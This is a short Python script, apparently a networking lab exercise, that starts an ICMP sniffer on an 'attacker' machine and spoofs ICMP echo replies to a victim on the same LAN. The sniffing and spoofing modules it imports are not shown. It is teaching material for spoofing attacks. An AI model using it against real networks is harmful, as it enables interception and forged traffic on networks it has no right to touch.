import os
import subprocess
from threading import Thread
from time import sleep
from sniffer import sniffer
from spoofer import Spoofer


def ping(ip):
    result = subprocess.run(['ping', '-c', '1', ip], capture_output=True)
    if "1 packets transmitted, 1 received" in result.stdout.decode():
        return True
    return False


def spoof_icmp():
    spoofer = Spoofer("ICMP", "192.168.0.100", 12345, "", 0)
    spoofer.run()


def start_sniffer():
    sniffer = sniffer("ICMP")
    sniffer.run()


if __name__ == "__main__":
    # machine A (Attacker) - run the sniffer 
    thread = Thread(target=start_sniffer)
    thread.start()

    # Machine B (Victim) - Send ICMP Echo Request (ping) to an IP X
    ip_x = "192.168.0.10"  # Replace with the IP address of the target machine
    if ping(ip_x):
        # Machine A (Attacker) - Spoof ICMP Echo Reply
        spoof_thread = Thread(target=spoof_icmp)
        spoof_thread.start()

    # Wait for the sniffing to capture ICMP Echo Request packets
    sleep(5)

    # Stop the Sniffer
    os.system("pkill -f sniffer.py")

    # Join the threads
    thread.join()
    spoof_thread.join()

    '''Please make sure to replace the IP address (192.168.0.10) in the ip_x variable
      with the actual IP address of the machine you want to ping (the victim machine).
      Also, adjust the IP address (192.168.0.100) and port (12345) in the spoof_icmp
      function to match your desired spoofed sender IP and port.
      Remember to run this program on the attacker machine and the sniffer.py program
      on the same LAN network.'''
